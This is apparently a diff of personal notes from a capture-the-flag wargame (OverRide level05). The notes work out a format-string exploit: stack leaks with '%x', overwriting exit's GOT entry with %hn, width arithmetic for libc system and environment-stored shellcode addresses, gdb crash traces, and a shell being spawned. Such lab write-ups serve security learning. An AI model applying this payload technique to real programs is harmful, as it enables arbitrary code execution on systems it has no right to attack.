@@ -1,0 +1,47 @@
+
+           ----------      nop       --------
+0xf7e6aed0  <system> 
+0xaed0 = 44752 - 8 = 44744   ---> 0xf7e6aed0
+0xf7e6 = 63462 - 44744 = 18718  ---> 0xf7e6aed2
+
+AAAA = 
+
+libc : 0xf7f897ec ("/bin/sh")
+
+0x97ec = 38892 - 8 = 38900  ---> 0xf7f897ec
+0xf7f8 = 63480 - 38900 = 24580 --> 0xf7f897ee
+
+
+-------------------  yes --------------------------
+OverRide:~$ cat <(python -c 'print "****" + "%x-" * 10') | ./level05
+****64-f7fcfac0-f7ec3af9-ffffd2cf-ffffd2ce-0-ffffffff-ffffd354-f7fdb000-2a2a2a2a-
+
+0x08048370 <exit@plt+0>:	jmp    DWORD PTR ds:0x80497e0
+
+
+env : 
+0xffffd66a : 
+
+0xd66a = 54890 - 8 = 54882
+0xffff = 65535 - 54882 = 10653
+
+
+exploit : 
+GOT exit + GOT exit+2  + %54882d%10$hn + %10653d%11$hn 
+
+(gdb)
+Stopped reason: SIGSEGV
+0x0007d66a in ?? ()
+hummmm lets try to change the got+2(%10653d) with %10648d (-5)
+Stopped reason: SIGSEGV
+0x0002d66a in ?? ()  <- nice (-5)
+
+-3 with 10645 
+
+[...]
+-134415680
+process 1851 is executing new program: /bin/dash
+warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
+Architecture of file not recognized.
+gdb-peda$
+ 
